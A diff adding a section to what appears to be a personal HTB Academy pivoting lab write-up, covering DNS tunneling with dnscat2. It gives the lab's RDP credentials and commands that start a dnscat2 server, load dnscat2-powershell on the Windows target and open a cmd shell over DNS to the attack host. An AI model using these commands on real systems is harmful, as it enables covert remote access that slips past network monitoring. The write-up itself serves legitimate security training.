@@ -305,3 +305,38 @@ Once inside, I navigated to the Approved Vendors folder and opened the VendorCon
 
 [![Screenshot-2025-03-04-153024.png](https://i.postimg.cc/MpJBbn5J/Screenshot-2025-03-04-153024.png)](https://postimg.cc/MvtXzKg9)
 
+
+## DNS Tunneling with Dnscat2
+
+*RDP to 10.129.42.198 (ACADEMY-PIVOTING-WIN10PIV) with user "htb-student" and password "HTB_@cademy_stdnt!"*
+
+* **Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer.**
+
+I began by connecting to the Windows host via RDP with 
+
+xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
+
+Once connected, I opened a new bash tab on my attack host and started the dns2server 
+
+sudo ruby dnscat2.rb --dns host=10.10.14.162,port=53,domain=inlanefreight.local --no-cache
+
+I opened another tab to clone the dns2client portion 
+
+ git clone https://github.com/lukebaggett/dnscat2-powershell.git
+
+Now I copied the dns2client to the windows host by copy and pasting it on the Desktop
+
+I proceeded to open a Powershell and importing the PS1 module 
+
+> Import-Module .\dnscat2.ps1
+PS C:\Users\htb-student\Desktop\dnscat2-powershell> Start-Dnscat2 -DNSserver 10.10.14.162 -Domain inlanefreight.local -PreSharedSecret f5c900b45f2feedcf213c4edb1906de9 -Exec cmd
+
+This opened a session with dnscat2 
+
+Once in the dnscat2 session I used
+
+session -i 1
+cd C:\Users\htb-student\Documents\
+type flag.txt 
+
+
